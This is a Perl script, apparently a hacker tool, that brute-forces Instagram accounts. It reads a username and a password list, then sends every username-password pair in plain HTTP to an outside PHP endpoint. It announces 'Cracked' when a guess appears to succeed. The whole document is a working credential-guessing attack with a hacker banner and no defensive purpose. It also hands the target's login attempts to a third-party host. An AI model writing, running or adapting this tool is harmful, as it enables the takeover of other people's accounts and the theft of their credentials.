use LWP::UserAgent;
system('cls');
print '
#####################################
Dev By 1337r00t
#####################################
CodeD Script [PHP URL]: HackerALAjman
#####################################
...........................................................................
.%%%%....%%%%%%..%%%%%%..%%%%%%.......%%%%%%\...../%%%\..../%%%\....%%%%%%.
...%%........%%......%%.....(%/.......%%....%)...%:...:%..%:...:%.....%%...
...%%....%%%%%%..%%%%%%....(%/........%%%%)%.}...%:...:%..%:...:%.....%%...
...%%........%%......%%...(%/.........%%...\%)...%:...:%..%:...:%.....%%...
.%%%%%%..%%%%%%..%%%%%%..(%...........%%....\%)...\%%%/....\%%%/......%%...
...........................................................................
';
print qq(
Enter Username:
> );
$user=<STDIN>;
chomp($user);
print qq(
Enter Password File:
> );
$list=<STDIN>;
chomp($list);
open (PASSFILE, "<$list") || die "[-] Can't Open The List Of Passwords !";
@LISTS = <PASSFILE>;
close PASSFILE;
foreach $P (@LISTS) {
chomp $P;
my $ua = LWP::UserAgent->new;
my $url = "http://www.insta-qtr.com/instaBF/instagram.php?users=$user&passs=$P";
my $req = HTTP::Request->new(GET => $url);
my $resp = $ua->request($req);
if ($resp->content=~ /<font color=red>/) {
    print "Failed ($user:$P)\n";
}
else {
    print "==========================================
	Cracked ($user:$P)
==========================================";
	exit;
}}
